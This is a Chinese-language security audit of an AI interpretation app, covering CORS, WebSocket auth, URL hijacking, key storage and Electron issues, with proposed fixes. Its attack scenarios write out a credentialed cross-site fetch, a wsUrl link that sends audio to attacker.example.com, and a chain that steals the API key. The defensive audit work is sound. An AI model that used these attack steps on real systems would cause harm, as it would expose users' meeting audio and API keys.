# competition2 升级改造方案 —— AI 同声传译助手

> 审计日期：2026-08-01
> 审计对象：`E:\competition2\competition2-main`（Python FastAPI 后端 `backend/`，React+Electron 前端 `frontend/`，Python 工具链 `tools/`，约 15,539 行）
> 审计方式：静态代码审查 + 配置核验 + 测试报告可信度分析

---

## 0. 执行摘要

### 0.1 项目现状评级

| 维度 | 评级 | 说明 |
|---|---|---|
| **版本控制** | **☆☆☆☆☆** | **整个项目没有 git 仓库，无任何版本历史（PROC-01）** |
| **网络安全** | **★☆☆☆☆** | **CORS 通配 + 默认绑 0.0.0.0 + WS 零鉴权 + wsUrl 可劫持（SEC-01～05）** |
| 实时管线设计 | ★★★★☆ | 音频队列有界、背压可观测、会话正确清理，设计扎实 |
| Electron 安全 | ★★★★☆ | 沙箱与 IPC 暴露面是教科书级，但 `openExternal` 漏了协议校验（SEC-07） |
| 密钥管理 | ★★★☆☆ | 快照脱敏设计正确，但落盘文件权限未限制（SEC-06） |
| 注入防护 | ★★★★★ | 无命令注入、无反序列化、无路径穿越（经专项排查，见 §4.4） |
| **测试可信度** | **★★☆☆☆** | **唯一耐久报告输入为静音，AI 管线零调用（TEST-01）** |
| 工程化 | ★☆☆☆☆ | 无 CI、无容器化、依赖未锁版本、测试文件平铺包根目录 |
| 代码规范 | ★★☆☆☆ | 6 个文件超 500 行，`endurance_runner.py` 达 992 行 |

### 0.2 本次审计验证过的事实（非推测）

```
git rev-parse --is-inside-work-tree  → fatal: not a git repository  ❌
ls .github                            → No such file or directory   ❌ 无 CI
python -c "import loguru"             → ModuleNotFoundError         ⚠️ 依赖未安装，无法本地跑测试
```

代码规模分布（超出 400 行规范的文件）：

```
992  tools/endurance_runner.py
820  tools/desktop_launcher.py
648  frontend/src/desktop/web-overlay.ts
640  frontend/src/ui/ControlPanel.tsx
541  tools/interpreter_validation_suite.py
508  frontend/src/store/AppStore.ts
480  frontend/src/ui/SubtitleHistoryPanel.tsx
467  frontend/src/ui/SettingsPanel.tsx
456  frontend/src/i18n.ts
424  backend/core/pipeline.py
```

### 0.3 问题清单总览

| 编号 | 严重度 | 问题 | 位置 |
|---|---|---|---|
| PROC-01 | **Critical** | 项目无 git 版本控制 | 仓库根目录 |
| SEC-01 | **Critical** | CORS 通配 `*` 且 `allow_credentials=True` | `backend/main.py:53-59` |
| SEC-04 | **Critical** | 后端默认绑定 `0.0.0.0`，绕开启动器即暴露公网 | `backend/core/config.py:19`、`.env.example:23` |
| SEC-02 | **High** | WebSocket 无鉴权、无 Origin 校验（CSWSH） | `backend/api/router.py:113,133` |
| SEC-03 | **High** | `?wsUrl=` 查询参数可劫持音频流到任意服务器 | `frontend/src/network/ws-url.ts:29-41` |
| SEC-05 | **High** | loopback 校验可被 `X-Forwarded-For` 绕过 | `backend/main.py:69-75`、`router.py:60-66` |
| SEC-06 | **High** | API key 明文落盘且文件权限未限制（0644） | `backend/services/local_settings.py:233-238,279-298` |
| SEC-07 | **High** | Electron `shell.openExternal` 未校验协议 | `frontend/electron/main.cjs:84-94` |
| TEST-01 | **High** | 唯一耐久测试用静音输入，AI 管线零验证 | `reports/endurance-60s-language-config.json` |
| SEC-08 | Medium | Redis 无认证、键无应用前缀 | `core/config.py:24`、`context_manager.py:43,86,209` |
| SEC-09 | Medium | 音频帧无大小与速率限制（成本攻击面） | `websocket_handler.py:69-71` |
| SEC-10 | Medium | 前端缺少 CSP（Electron 环境风险放大） | `frontend/index.html:3-8` |
| ARCH-01 | Medium | 会话 ID 仅 8 位十六进制，可枚举 | `backend/api/router.py:127` |
| ARCH-02 | Medium | NMT 失败无重试、无降级，直接中断会话 | `backend/services/nmt_service.py:141` |
| QUAL-01 | Medium | 无 CI、依赖未锁版本、测试平铺包根 | 多处 |
| SEC-11 | Low | 日志泄露 Redis 密码与会议内容 | `context_manager.py:33`、`revision_service.py:164` |
| QUAL-02 | Low | 6 个文件严重超出 400 行规范 | 见上表 |

---

## 1. Critical 问题

### PROC-01【Critical】项目没有版本控制

#### 实证

```
$ cd E:/competition2/competition2-main && git rev-parse --is-inside-work-tree
fatal: not a git repository (or any of the parent directories): .git
```

项目**存在 `.gitignore` 文件**（内容还很完善，正确忽略了 `.env`、`.venv/`、
`__pycache__/`、`config/desktop-settings.local.json`），
**但从未执行过 `git init`** —— 说明作者有版本控制意识，却没有落地。

对比之下，competition1 和 competition3 都有完整 git 历史。

#### 影响

1. **无法回滚**：任何一次误改都不可恢复
2. **无法证明工作量**：竞赛评审常参考提交历史评估开发过程的真实性与投入
3. **无法协作**：多人开发无从谈起
4. **无法接 CI**：没有仓库就没有触发点
5. **交付风险**：目录名为 `competition2-main`，形似从 zip 解压而来 —— 若原始仓库丢失，历史彻底无法追溯

#### 修复（立即执行，5 分钟）

```bash
cd E:/competition2/competition2-main

git init
git branch -M main

# .gitignore 已存在且内容完善，先确认没有敏感文件会被提交
git add -A
git status --short | head -50          # ← 人工核对，确认无 .env / *.local.json / 密钥

# 特别确认这些文件不在暂存区
git status --short | grep -E "\.env$|\.env\.local|desktop-settings\.local\.json|\.venv"
# ↑ 应无输出

git commit -m "chore: 初始化版本控制

导入 AI 同声传译助手完整代码库：
- backend: FastAPI 实时同传管线（ASR → NMT → 修正引擎）
- frontend: React + Electron 桌面客户端与字幕悬浮窗
- tools: 耐久测试、启动器、字幕产物校验工具"
```

随后建议按功能模块补做几个语义化提交，让历史更可读。
若有远程仓库，同步推送。

---

### SEC-01【Critical】CORS 通配且允许携带凭据

#### 问题

`backend/main.py:53-59`：

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],          # ← 允许任意来源
    allow_credentials=True,        # ← 同时允许携带 Cookie/凭据
    allow_methods=["*"],
    allow_headers=["*"],
)
```

`allow_origins=["*"]` 与 `allow_credentials=True` 的组合是 CORS 配置中的经典错误。

> 注：现代浏览器会拒绝这个组合（规范禁止 `Access-Control-Allow-Origin: *`
> 与 `Allow-Credentials: true` 同时生效）。但 Starlette 的 `CORSMiddleware`
> 在 `allow_credentials=True` 时会把 `*` 替换成**请求方的实际 Origin 回显**，
> 从而绕过浏览器限制 —— 结果是**任意网站都能带着凭据调用你的 API**。

#### 攻击场景

用户在浏览器打开恶意网页时，该网页可直接调用本机后端：

```javascript
// 攻击者页面上的脚本
fetch('http://127.0.0.1:8000/api/v1/settings/local', {
  credentials: 'include'
}).then(r => r.json()).then(console.log);
```

`backend/api/middleware.py` 中另有一个 `cors_middleware` 函数
（同样硬编码 `Access-Control-Allow-Origin: *`），当前未被注册，属于死代码，
但若未来被误接入会造成同样问题。

#### 修复

```python
# backend/core/config.py 新增配置项
class Settings(BaseSettings):
    # ...
    # CORS：逗号分隔的允许来源列表。桌面/本地场景默认只放行本机前端。
    allowed_origins: str = "http://127.0.0.1:5173,http://localhost:5173"

    @property
    def allowed_origin_list(self) -> list[str]:
        """解析为来源列表，去除空白项。"""
        return [item.strip() for item in self.allowed_origins.split(",") if item.strip()]
```

```python
# backend/main.py
app.add_middleware(
    CORSMiddleware,
    allow_origins=settings.allowed_origin_list,   # 显式白名单，不再通配
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "OPTIONS"],
    allow_headers=["Content-Type", "Authorization"],
)
```

同时**删除** `backend/api/middleware.py` 中未使用的 `cors_middleware` 函数，
避免它日后被误接入。

---

## 2. High 问题

### SEC-02【High】WebSocket 无鉴权且无 Origin 校验

#### 问题

`backend/api/router.py:113` 与 `:133` 的两个 WebSocket 端点：

```python
@router.websocket("/ws/translate")
async def websocket_translate(ws: WebSocket):
    handler = get_ws_handler()
    # ...
    session_id = str(uuid.uuid4())[:8]
    await handler.handle_connection(ws, session_id)


@router.websocket("/ws/translate/{session_id}")
async def websocket_translate_with_session(ws: WebSocket, session_id: str):
    # ...
    await handler.handle_connection(ws, session_id)      # ← session_id 完全由客户端指定
```

**两个问题叠加：**

1. **无 Origin 校验（CSWSH，跨站 WebSocket 劫持）**：
   WebSocket 握手**不受同源策略约束**。任意网站的脚本都能连接
   `ws://127.0.0.1:8000/api/v1/ws/translate` 并发送音频、接收翻译结果。
   REST 端点用 `require_loopback_client` 做了 loopback 校验（`router.py:60`），
   **但 WebSocket 端点完全没有任何校验** —— 这是明显的防护不一致。

2. **会话可越权接管**：第二个端点接受客户端任意指定的 `session_id`。
   结合 `websocket_handler.py:49-52` 的逻辑：

   ```python
   existing = self._active_pipelines.get(session_id)
   if existing:
       logger.info("Replacing active pipeline for reconnecting session {}", session_id)
       await existing.stop()      # ← 踢掉原会话
   ```

   攻击者只要猜中 `session_id`，就能**踢掉正在进行的会话并接管**
   （拿到后续所有 ASR 与翻译结果）。而 `session_id` 只有 8 位十六进制（见 ARCH-01）。

#### 修复

```python
# backend/api/router.py

from urllib.parse import urlparse

from fastapi import WebSocket, status


def _is_allowed_ws_origin(origin: str | None) -> bool:
    """校验 WebSocket 握手的 Origin 头。

    WebSocket 不受同源策略保护，必须服务端主动校验，
    否则任意网站都可连接本地服务（CSWSH）。

    Args:
        origin: 握手请求中的 Origin 头，可能为 None（非浏览器客户端）。

    Returns:
        是否允许该来源建立连接。
    """
    # 非浏览器客户端（如测试工具）不带 Origin。
    # 桌面场景可放行；若要严格限制，改为 return False 并让工具显式带 Origin。
    if origin is None:
        return True

    if origin in settings.allowed_origin_list:
        return True

    # 额外放行 Electron 的 file:// 来源
    parsed = urlparse(origin)
    return parsed.scheme == "file"


async def _reject_unauthorized_ws(ws: WebSocket) -> None:
    """拒绝未授权的 WebSocket 握手。"""
    await ws.close(code=status.WS_1008_POLICY_VIOLATION)


@router.websocket("/ws/translate")
async def websocket_translate(ws: WebSocket):
    """WebSocket 翻译端点（新建会话）。"""
    if not _is_allowed_ws_origin(ws.headers.get("origin")):
        logger.warning("Rejected websocket from origin {}", ws.headers.get("origin"))
        await _reject_unauthorized_ws(ws)
        return

    handler = get_ws_handler()
    if not handler:
        await ws.accept()
        await ws.send_json({
            "type": "error",
            "code": "SERVICE_NOT_READY",
            "message": "Translation service is not initialized",
        })
        await ws.close()
        return

    # 使用完整 UUID 而非截断值（见 ARCH-01）
    session_id = secrets.token_urlsafe(24)
    await handler.handle_connection(ws, session_id)
```

对于**重连端点**，仅靠 session_id 不足以证明身份，应引入一次性重连令牌：

```python
@router.websocket("/ws/translate/{session_id}")
async def websocket_translate_with_session(ws: WebSocket, session_id: str):
    """WebSocket 翻译端点（重连到既有会话）。

    重连必须提供首次连接时下发的 reconnect_token，
    否则任何人猜到 session_id 就能接管会话。
    """
    if not _is_allowed_ws_origin(ws.headers.get("origin")):
        await _reject_unauthorized_ws(ws)
        return

    handler = get_ws_handler()
    if not handler:
        # ... 同上
        return

    token = ws.query_params.get("token", "")
    if not handler.verify_reconnect_token(session_id, token):
        logger.warning("Rejected reconnect with invalid token for session {}", session_id)
        await _reject_unauthorized_ws(ws)
        return

    await handler.handle_connection(ws, session_id)
```

`WebSocketHandler` 侧配套实现：

```python
# backend/api/websocket_handler.py

import hmac
import secrets


class WebSocketHandler:
    def __init__(self) -> None:
        # ...
        self._reconnect_tokens: dict[str, str] = {}

    def issue_reconnect_token(self, session_id: str) -> str:
        """为会话签发重连令牌，随 SESSION_STARTED 消息下发给客户端。"""
        token = secrets.token_urlsafe(32)
        self._reconnect_tokens[session_id] = token
        return token

    def verify_reconnect_token(self, session_id: str, token: str) -> bool:
        """校验重连令牌，使用常量时间比较避免时序侧信道。"""
        expected = self._reconnect_tokens.get(session_id)
        if not expected or not token:
            return False
        return hmac.compare_digest(expected, token)
```

会话结束时记得清理令牌（在 `websocket_handler.py:82-83` 的 pipeline 清理处一并处理）。

---

### SEC-03【High】wsUrl 查询参数可劫持音频流

#### 问题

`frontend/src/network/ws-url.ts:29-41`：

```typescript
export function getRuntimeWebSocketUrlFromSearch(search: string): string | null {
  const value = new URLSearchParams(search).get(RUNTIME_WS_URL_QUERY_PARAM)
  return normalizeWebSocketUrl(value)
}

function normalizeWebSocketUrl(value: string | null | undefined): string | null {
  const trimmed = value?.trim() ?? ''
  if (trimmed.length === 0) {
    return null
  }
  return trimmed.replace(/\/+$/, '')      // ← 只 trim + 去尾斜杠，零校验
}
```

`normalizeWebSocketUrl` **完全没有协议校验、没有主机白名单**。
且在 `AppStore.ts:466-467` 中，runtime URL 拥有**最高优先级**：

```typescript
return resolveWebSocketBaseUrl({
  runtimeUrl: hasWindow ? getRuntimeWebSocketUrlFromSearch(window.location.search) : null,
  // ↑ 优先于 configuredUrl 和默认值
```

#### 攻击场景

诱导用户点击：

```
http://127.0.0.1:5173/?wsUrl=ws://attacker.example.com/collect
```

前端会把**用户的全部实时音频流**发送到攻击者服务器，
并接收攻击者伪造的"翻译结果"显示给用户。

同传场景下音频往往是会议、课堂、商务谈判内容 —— 属于高度敏感数据。

#### 修复

```typescript
// frontend/src/network/ws-url.ts

/** 允许的 WebSocket 主机（仅本机回环）。 */
const ALLOWED_WS_HOSTNAMES = new Set(['127.0.0.1', 'localhost', '::1'])

/**
 * 归一化并校验 WebSocket URL。
 *
 * 运行时 URL 可能来自查询参数（不可信输入），
 * 必须限制协议为 ws/wss 且主机为本机，
 * 否则可被诱导将音频流发送到攻击者服务器。
 *
 * @param value 待校验的 URL
 * @returns 合法时返回归一化 URL，否则返回 null
 */
function normalizeWebSocketUrl(value: string | null | undefined): string | null {
  const trimmed = value?.trim() ?? ''
  if (trimmed.length === 0) {
    return null
  }

  let parsed: URL
  try {
    parsed = new URL(trimmed)
  } catch {
    return null
  }

  if (parsed.protocol !== 'ws:' && parsed.protocol !== 'wss:') {
    return null
  }

  // 去掉 IPv6 字面量的方括号后比较
  const hostname = parsed.hostname.replace(/^\[|\]$/g, '').toLowerCase()
  if (!ALLOWED_WS_HOSTNAMES.has(hostname)) {
    return null
  }

  return trimmed.replace(/\/+$/, '')
}
```

> **若确有远程部署需求**：不要放开这个校验，而应通过**构建期环境变量**
> （`import.meta.env.VITE_WS_URL`）配置，让地址在打包时固化，
> 而不是运行时可被 URL 参数覆盖。

配套补充测试用例到 `frontend/src/network/ws-url.test.ts`：

```typescript
describe('normalizeWebSocketUrl — 安全校验', () => {
  const maliciousUrls = [
    'ws://attacker.example.com/collect',
    'wss://evil.cn/x',
    'http://127.0.0.1:8000/api',      // 协议不对
    'javascript:alert(1)',
    'ws://169.254.169.254/',           // 云元数据
    'ws://192.168.1.100:8000/',        // 内网他机
  ]

  it.each(maliciousUrls)('拒绝 %s', (url) => {
    expect(resolveWebSocketBaseUrl({ runtimeUrl: url }))
      .toBe(`ws://127.0.0.1:8000/api/v1/ws/translate`)   // 回落到默认值
  })

  it('接受本机地址', () => {
    expect(resolveWebSocketBaseUrl({ runtimeUrl: 'ws://127.0.0.1:8000/api/v1/ws/translate' }))
      .toBe('ws://127.0.0.1:8000/api/v1/ws/translate')
  })
})
```


> **补充**：由同一参数派生 settings API 地址的那条路径**已有协议白名单**
> —— `frontend/src/desktop/settings.ts:170-190` 的
> `createSettingsApiUrlFromWebSocketUrl` 显式校验了 `ws:`/`wss:`。
> 所以修 `ws-url.ts` 时只需补主机白名单，不必改动 settings 那条路径。

---

### SEC-04【Critical】后端默认绑定 0.0.0.0

#### 问题（已实测确认）

`backend/core/config.py:19`：

```python
host: str = "0.0.0.0"        # ← 监听所有网络接口
```

`backend/.env.example:23` 同样写着 `HOST=0.0.0.0`，用户复制模板即继承该配置。

桌面启动器路径确实做了覆盖（`tools/desktop_launcher.py:39` 定义 `HOST = "127.0.0.1"`，
`:563` 通过 `--host` 传入），**但只要绕开启动器**——手动 `python main.py`、
用 IDE 运行、或按 README 复制 `.env.example`——服务就直接暴露到局域网/公网。

#### 攻击场景

叠加 SEC-02（WebSocket 无 Origin 校验、无鉴权），同一 WiFi 下的任何人：

```bash
# 扫描到你的 IP 后直接连
wscat -c ws://192.168.1.x:8000/api/v1/ws/translate
```

即可消耗你的 ASR/翻译 API 额度，或枚举 session_id 窃听正在进行的会议字幕。
在竞赛现场（公共 WiFi、评委与其他参赛队同网段）这是**极高风险**。

#### 修复（成本：两个字面量）

```python
# backend/core/config.py:19
host: str = "127.0.0.1"      # 默认仅本机；需要局域网访问时显式配置 HOST
```

```bash
# backend/.env.example:23
# 默认仅监听本机。如需局域网访问，请先配置鉴权再改为 0.0.0.0。
HOST=127.0.0.1
```

---

### SEC-05【High】loopback 校验可被 X-Forwarded-For 绕过

#### 问题（已实测确认）

`backend/api/router.py:60-66` 的 loopback 校验读取 `request.client.host`：

```python
def require_loopback_client(request: Request) -> None:
    client_host = request.client.host if request.client else ""
    if client_host not in LOOPBACK_CLIENT_HOSTS:
        raise HTTPException(status_code=403, detail="local settings require a loopback client")
```

但 `backend/main.py:69-75` 启动 uvicorn 时**未禁用 proxy headers**：

```python
uvicorn.run(
    "main:app",
    host=settings.host,
    port=settings.port,
    reload=settings.debug,
    log_level="info",
)      # ← 缺 proxy_headers=False
```

实测 uvicorn 的默认值：

```
$ python -c "import inspect; from uvicorn import Config; \
    print(inspect.signature(Config.__init__).parameters['proxy_headers'].default)"
True
```

`proxy_headers=True` 时，`ProxyHeadersMiddleware` 会在请求来自受信主机时
用 `X-Forwarded-For` **覆写 `scope["client"]`**。

#### 两个反直觉后果

1. **正常本机请求被误拒**：本机请求若带上 `X-Forwarded-For: 8.8.8.8`，
   校验反而失败返回 403。
2. **部署在反向代理后即被绕过**：一旦放宽 `forwarded_allow_ips`
   （放在 nginx 后是常见做法），远程攻击者只需发送
   `X-Forwarded-For: 127.0.0.1` 即可通过校验，**读写含 API key 的本地配置**。

配合 SEC-01 的 CORS 通配，攻击链完整：

```
恶意网页 → 跨站 PUT /api/v1/settings/local
        → 把 openaiBaseUrl 改成攻击者服务器
        → desktop_launcher.py:336 将该值写入 OPENAI_BASE_URL
        → 用户的 API key 随每次翻译请求发往攻击者
```

#### 修复

```python
# backend/main.py
uvicorn.run(
    "main:app",
    host=settings.host,
    port=settings.port,
    reload=settings.debug,
    log_level="info",
    proxy_headers=False,     # 本地服务不在代理后，禁用 X-Forwarded-* 覆写
)
```

若将来确需部署在反向代理后，则应改用真正的鉴权机制（令牌/证书），
而不是依赖 IP 判断。

---

### SEC-06【High】API key 明文落盘且文件权限未限制

#### 问题

这一条与方案中已肯定的"快照脱敏"是**不同层面**：
`create_settings_snapshot`（`local_settings.py:252-276`）只暴露
`hasOpenaiApiKey` 布尔量，**这部分做得对**。

但 `create_settings_file_payload`（`:279-298`）把**密钥原文**写入磁盘：

```python
def create_settings_file_payload(settings: LocalSettings) -> dict[str, object]:
    return {
        "translation": {
            "openaiApiKey": settings.translation.openai_api_key,       # ← 明文
            "anthropicApiKey": settings.translation.anthropic_api_key,  # ← 明文
        },
        ...
    }
```

而写入方式（`:233-238`）使用 `Path.write_text`，**继承默认 umask**：

```python
temp_path = path.with_name(f"{path.name}.tmp")
temp_path.write_text(...)        # ← 权限由 umask 决定，通常 0644
temp_path.replace(path)
```

结果：`config/desktop-settings.local.json` 及其 `.tmp` 中间文件
**对同机其他用户可读**。Electron 侧 `main.cjs:295-300` 存在同样问题。

#### 修复

```python
import os
import stat

def write_local_settings(settings: LocalSettings, path: Path = LOCAL_SETTINGS_PATH) -> None:
    """原子写入本地设置。

    文件含 API key，必须以 0600 权限创建 —— 先建立权限再写入内容，
    避免出现"短暂可读"的时间窗口。
    """
    path.parent.mkdir(parents=True, exist_ok=True)
    temp_path = path.with_name(f"{path.name}.tmp")

    payload = json.dumps(create_settings_file_payload(settings), ensure_ascii=False, indent=2)

    # 以 0600 创建，写入后再原子替换
    fd = os.open(temp_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, stat.S_IRUSR | stat.S_IWUSR)
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as handle:
            handle.write(payload)
    except Exception:
        temp_path.unlink(missing_ok=True)
        raise

    temp_path.replace(path)
```

> Windows 上 `os.open` 的权限位语义有限，`S_IRUSR|S_IWUSR` 不会像 POSIX 那样
> 精确映射到 ACL。若目标平台以 Windows 为主，可额外调用 `icacls`
> 或使用 `pywin32` 设置 ACL；至少 `.tmp` 文件不再是全局可读的 0644。

---

### SEC-07【High】Electron `shell.openExternal` 未校验协议

#### 问题

方案中已肯定 `webPreferences` 与 `preload.cjs` 的配置——那部分确实做得好。
但 `frontend/electron/main.cjs:84-94` 这两处漏掉了协议校验：

```javascript
window.webContents.setWindowOpenHandler(({ url: targetUrl }) => {
  shell.openExternal(targetUrl)          // ← 未校验协议
  return { action: 'deny' }
})

window.webContents.on('will-navigate', (event, targetUrl) => {
  if (targetUrl !== url && !targetUrl.startsWith(url)) {
    event.preventDefault()
    shell.openExternal(targetUrl)        // ← 同样未校验
  }
})
```

`shell.openExternal` 会把 URL 交给**操作系统**按协议处理器打开。可达协议包括：

- `file:///` —— 打开本地任意文件/目录
- `smb://` —— Windows 上可触发 SMB 连接，**泄露 NTLM 哈希**
- 任意已注册的自定义协议处理器

当前渲染层无注入点（`SubtitleRenderer.ts:140-141` 全程用 `textContent`），
所以定级 High 而非 Critical。托盘的 `shell.openPath`（`:471`）同理。

#### 修复

```javascript
/** 只允许通过系统浏览器打开的协议。 */
const SAFE_EXTERNAL_PROTOCOLS = new Set(['https:', 'http:'])

/**
 * 安全地用系统默认程序打开外部链接。
 *
 * shell.openExternal 会交给 OS 按协议分发，file:// 与 smb:// 等
 * 可造成本地文件访问或 NTLM 哈希泄露，必须限制协议。
 *
 * @param {string} targetUrl 待打开的 URL
 */
function openExternalSafely(targetUrl) {
  let parsed
  try {
    parsed = new URL(targetUrl)
  } catch {
    return
  }

  if (!SAFE_EXTERNAL_PROTOCOLS.has(parsed.protocol)) {
    console.warn('拒绝打开非 http(s) 链接:', parsed.protocol)
    return
  }

  void shell.openExternal(targetUrl)
}
```

然后把 `:85` 与 `:92` 的 `shell.openExternal(targetUrl)`
替换为 `openExternalSafely(targetUrl)`。

---

### SEC-08【Medium】Redis 无认证、键无应用前缀

#### 问题

`backend/core/config.py:24`：

```python
redis_url: str = "redis://localhost:6379/0"      # 无密码
```

`backend/services/context_manager.py` 的键命名（`:43`、`:86`、`:209`）：

```python
meta_key = f"session:{session_id}:meta"
key = f"session:{session_id}:segments"
key = f"session:{session_id}:audio:{segment_id}"
```

**两个问题：**

1. **无应用前缀**：`session:` 是极通用的前缀，与同 Redis 实例的其他应用
   共用命名空间，存在键冲突与相互覆盖风险。
2. **无认证**：默认 Redis 无密码，同机任何进程都能读取
   **完整的会议转写原文、译文，以及 hex 编码的原始音频**（`:210`）。

且 `session_id` 未做字符校验就拼入键名 —— 配合已确认的 8 位可枚举问题
（ARCH-01），攻击者可直接读取他人会话上下文。

> 正面：TTL 都正确设置了（segments 300s / audio 120s），数据不会无限驻留。

#### 修复

```python
# backend/core/config.py
redis_url: str = "redis://localhost:6379/0"
#: Redis 键前缀，避免与同实例其他应用冲突
redis_key_prefix: str = "ai-interpreter"
```

```python
# backend/services/context_manager.py

def _session_key(self, session_id: str, suffix: str) -> str:
    """构造带应用前缀的 Redis 键。

    Args:
        session_id: 会话标识，必须已通过字符校验。
        suffix: 键后缀，如 "meta" / "segments"。

    Returns:
        形如 "ai-interpreter:session:{id}:{suffix}" 的键名。

    Raises:
        ValueError: session_id 含非法字符时。
    """
    if not re.fullmatch(r"[A-Za-z0-9_-]{1,64}", session_id):
        raise ValueError(f"非法的 session_id: {session_id!r}")
    return f"{settings.redis_key_prefix}:session:{session_id}:{suffix}"
```

生产部署时务必为 Redis 配置 `requirepass` 并在 `REDIS_URL` 中携带密码。

---

### SEC-09【Medium】音频帧无大小与速率限制

#### 问题

`backend/api/websocket_handler.py:69-71` 直接把接收到的字节送入管线：

```python
if raw["type"] == "websocket.receive":
    if "bytes" in raw:
        await pipeline.process_audio(raw["bytes"])      # ← 无大小校验
```

uvicorn 的 `ws_max_size` 默认为 **16 MiB**。`pipeline.py:58-60` 的
`Queue(maxsize=100)` 背压设计是对的（方案中已肯定），
但**每个元素最大可达 16 MiB → 最坏情况 1.6 GB 常驻内存**。

更关键的是成本维度：`asr_service.py:113-116` 每积满 32000 样本
就触发一次远程 ASR + LLM 调用 —— **攻击者控制的是你的钱包，不只是 CPU**。

另：`np.frombuffer(audio_bytes, dtype=np.float32)` 对非 4 字节倍数的输入
会抛 `ValueError`，被 `pipeline.py:187-188` 的宽泛 `except Exception` 吞掉
—— 不会崩溃，但会持续刷日志。

#### 修复

```python
# backend/core/config.py
#: 单个音频帧的字节上限（100ms @ 16kHz float32 约 6.4KB，留足余量）
audio_max_chunk_bytes: int = 64 * 1024
#: 每秒允许的最大音频帧数
audio_max_chunks_per_second: int = 20
```

```python
# backend/api/websocket_handler.py

if "bytes" in raw:
    chunk = raw["bytes"]

    # 单帧大小限制
    if len(chunk) > settings.audio_max_chunk_bytes:
        logger.warning(
            "Session {} sent oversized audio chunk ({} bytes), closing",
            session_id, len(chunk),
        )
        await ws.close(code=status.WS_1009_MESSAGE_TOO_BIG)
        break

    # 帧对齐校验：float32 要求 4 字节倍数
    if len(chunk) % 4 != 0:
        logger.warning("Session {} sent misaligned audio chunk, ignoring", session_id)
        continue

    # 速率限制
    if not rate_limiter.allow():
        logger.warning("Session {} exceeded audio rate limit", session_id)
        continue

    await pipeline.process_audio(chunk)
```

启动 uvicorn 时同步收紧：`ws_max_size=65536`。

---

### SEC-10【Medium】前端缺少 CSP

`frontend/index.html:3-8` 的 `<head>` 内无 CSP meta，Electron 侧也没有
通过 `onHeadersReceived` 注入 CSP。

当前渲染路径是安全的（全部走 `textContent`/JSX；唯一的 `innerHTML` 是
`SubtitleRenderer.ts:86` 的 `= ''` 清空操作，无风险），所以定级 Medium。
但在 **Electron 环境下**缺少 CSP 意味着未来任何一处注入点
都可能直接升级为 RCE 级别的问题。

```html
<!-- frontend/index.html -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               style-src 'self' 'unsafe-inline';
               img-src 'self' data: blob:;
               media-src 'self' blob:;
               connect-src 'self' ws://127.0.0.1:8000 http://127.0.0.1:8000;
               frame-ancestors 'none';">
```

> **注意**：`style-src` 必须保留 `'unsafe-inline'` ——
> `SubtitleRenderer.ts:28-41` 使用 `style.cssText` 动态设置字幕样式，
> 移除该项会导致字幕样式失效。

---

### SEC-11【Low】日志泄露敏感信息

两处需要脱敏：

**1. Redis URL 含密码时会被完整记录** —— `context_manager.py:33`：

```python
logger.info("Redis connected: {}", settings.redis_url)
```

按 SEC-08 为 Redis 加上密码后，密码即随日志泄露。
项目中**已有现成的脱敏工具**可复用：`tools/endurance_preflight.py:180-187`
的 `redact_url` 函数。

**2. 会议内容进日志** —— `revision_service.py:164-171` 与 `:206-211`
以 INFO 级别记录转写原文与译文的前 50 字符：

```python
logger.info(
    "ASR correction triggered for {} via {} in {}ms: '{}' -> '{}'",
    segment.id, correction_source, latency_ms,
    original_source[:50],       # ← 会议内容
    corrected[:50],             # ← 翻译结果
)
```

这些内容会落入 `logs/desktop-launcher.log`。同传场景下的会议/课堂内容
属于敏感数据，建议降为 DEBUG 级别，或只记录长度与哈希：

```python
logger.debug(
    "ASR correction for {} via {} in {}ms (len {} -> {})",
    segment.id, correction_source, latency_ms,
    len(original_source), len(corrected),
)
```

---

---

### TEST-01【High】耐久测试未验证 AI 管线

#### 问题

`reports/endurance-60s-language-config.json` 是项目中唯一的耐久测试产物。
逐字段分析：

```json
{
  "audio_source": "silence",           ← 输入是静音
  "duration_seconds": 62.093,
  "sent_audio_chunks": 600,
  "latest_diagnostics": {
    "asr_segments": 0,                 ← ASR 一句都没识别
    "translation_segments": 0,         ← 翻译一次都没跑
    "revision_segments": 0,            ← 修正引擎一次都没触发
    "api_call_counts": {}              ← 上游 API 零调用
  }
}
```

另一份 `endurance-preflight-2026-06-06.json` 更直接：

```json
"blockers": ["ANTHROPIC_API_KEY is missing or still uses a placeholder value."]
```

**这份报告证明的是**：WebSocket 能连、音频能传（600 chunk / 3.84MB 全部送达、
零丢弃、队列最大深度 1、排队延迟 avg 0ms / max 16ms）—— 这部分**确实有价值**，
说明传输层稳健。

**但它没有证明**：ASR 能识别、翻译质量如何、端到端延迟多少、
长时间运行会不会内存泄漏、上游 API 限流时如何表现。

而这些恰恰是"同声传译助手"的**核心能力**。

#### 修复：建立真实音频的端到端基准测试

**第一步：准备测试音频集**

```
tests/fixtures/audio/
├── en-short-clear.wav       # 30s 清晰英语，安静环境
├── en-long-lecture.wav      # 10min 讲座录音，含停顿
├── en-noisy-meeting.wav     # 5min 会议录音，多人+背景噪音
├── en-accented.wav          # 3min 带口音英语
└── expected/
    ├── en-short-clear.json  # 人工校对的参考译文与时间轴
    └── ...
```

> 可使用公开数据集（LibriSpeech、CommonVoice）的片段，注意标注来源与许可。

**第二步：扩展 `tools/endurance_runner.py` 支持真实音频源**

现有工具已支持 `audio_source` 参数（当前值为 `"silence"`），
扩展为可指定 wav 文件，并新增以下指标：

```python
@dataclass(frozen=True)
class EnduranceMetrics:
    """端到端耐久测试指标。"""

    # 现有传输层指标（保留）
    sent_audio_chunks: int
    dropped_audio_chunks: int
    audio_queue_max_depth: int

    # 新增：AI 管线指标
    asr_segments: int
    translation_segments: int
    #: ASR 首字延迟：音频送入到首个 partial 返回
    asr_first_token_latency_ms: LatencyStats
    #: 端到端延迟：音频送入到翻译 final 返回
    end_to_end_latency_ms: LatencyStats
    #: 与参考译文的 BLEU 分数（可选，需 sacrebleu）
    bleu_score: float | None
    #: 词错误率（ASR 质量）
    word_error_rate: float | None
    #: 进程 RSS 内存变化，用于检测泄漏
    memory_growth_mb: float
    #: 上游 API 调用次数与失败次数
    api_call_counts: dict[str, int]
    api_failure_counts: dict[str, int]
```

**第三步：定义验收基线**

在 `docs/PERFORMANCE_BASELINE.md` 中固化：

| 指标 | 目标值 | 说明 |
